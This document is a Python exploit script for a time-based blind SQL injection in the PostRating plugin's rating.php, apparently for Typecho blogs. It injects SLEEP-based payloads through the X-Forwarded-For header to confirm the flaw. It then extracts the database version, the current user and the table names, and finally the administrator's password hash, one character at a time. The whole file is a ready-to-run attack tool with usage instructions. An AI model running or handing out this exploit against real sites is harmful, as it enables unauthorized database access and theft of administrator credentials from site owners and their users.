#!/usr/bin/env python3
"""
PostRating SQL Injection Exploit
CVSS: 8.8 High

Target: PostRating/rating.php
Vulnerability: SQL Injection via X-Forwarded-For and Cookie

Requirements:
    pip install requests

Usage:
    python3 postrating_sqli.py <target_url> [--cid CID] [--rating RATING]

Example:
    python3 postrating_sqli.py http://target.com/PostRating/rating.php
"""

import requests
import time
import string
import sys

class PostRatingSQLInjector:
    def __init__(self, target_url):
        self.target = target_url
        self.charset = string.ascii_lowercase + string.digits + '_'
        self.session = requests.Session()
    
    def test_vulnerability(self):
        """Test if target is vulnerable"""
        print("[*] Testing SQL Injection vulnerability...")
        
        # Normal request - should complete quickly
        start = time.time()
        try:
            r1 = self.session.post(self.target, 
                                 data={'rating': '5', 'cid': '1'},
                                 headers={'X-Forwarded-For': 'test'})
            normal_time = time.time() - start
        except Exception as e:
            print(f"[-] Request failed: {e}")
            return False
        
        # Time-based blind SQL injection payload
        payload = "1' AND (SELECT 1 FROM (SELECT SLEEP(3))a) AND '"
        
        print(f"[*] Sending time-based payload...")
        start = time.time()
        try:
            r2 = self.session.post(self.target,
                                  data={'rating': '5', 'cid': '1'},
                                  headers={'X-Forwarded-For': payload,
                                          'Referer': 'http://target.com/'})
            elapsed = time.time() - start
        except requests.Timeout:
            elapsed = 3.0
        except Exception as e:
            print(f"[-] Error: {e}")
            return False
        
        print(f"[*] Normal time: {normal_time:.3f}s, Sleep time: {elapsed:.3f}s")
        
        if elapsed >= 2.5:
            print("[+] VULNERABLE! Time-based blind SQL injection confirmed")
            return True
        else:
            print("[-] Target may not be vulnerable or WAF is blocking")
            return False
    
    def extract_data(self, query, max_len=50):
        """Extract data using time-based blind injection"""
        print(f"[*] Extracting: {query[:60]}...")
        result = ""
        
        for pos in range(1, max_len + 1):
            for char in self.charset:
                payload = f"1' AND IF(SUBSTRING(({query}),{pos},1)='{char}',SLEEP(1),0) AND '"
                
                start = time.time()
                try:
                    self.session.post(self.target,
                                     data={'rating': '5', 'cid': '1'},
                                     headers={'X-Forwarded-For': payload,
                                             'Referer': 'http://target.com/'},
                                     timeout=5)
                except requests.Timeout:
                    pass
                except Exception:
                    pass
                elapsed = time.time() - start
                
                if elapsed >= 0.9:
                    result += char
                    print(f"    [{pos}] {result}")
                    break
            else:
                # Character not found
                break
        
        return result
    
    def get_database_info(self):
        """Extract database version and user"""
        version = self.extract_data("SELECT @@version", 20)
        user = self.extract_data("SELECT CURRENT_USER()", 30)
        
        print(f"\n[+] Database Version: {version}")
        print(f"[+] Current User: {user}")
        return version, user
    
    def get_table_names(self):
        """Extract all table names"""
        return self.extract_data(
            "SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE()",
            200
        )
    
    def get_typecho_users(self):
        """Extract Typecho user credentials"""
        # Try to find admin password hash
        password = self.extract_data(
            "SELECT password FROM typecho_users WHERE role='administrator' LIMIT 1",
            64
        )
        print(f"\n[+] Admin Password Hash: {password}")
        return password
    
    def dump_database(self):
        """Full database dump"""
        print("\n[*] Starting full database dump...")
        
        self.get_database_info()
        
        tables = self.get_table_names()
        print(f"\n[+] Tables: {tables}")
        
        users = self.get_typecho_users()
        print(f"[+] Admin password hash extracted")

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_url>")
        print(f"Example: {sys.argv[0]} http://target.com/PostRating/rating.php")
        sys.exit(1)
    
    injector = PostRatingSQLInjector(sys.argv[1])
    
    if not injector.test_vulnerability():
        print("\n[-] Target does not appear vulnerable")
        sys.exit(1)
    
    print("\n[*] Starting data extraction...")
    injector.dump_database()
    
    print("\n[*] Done!")

if __name__ == "__main__":
    main()
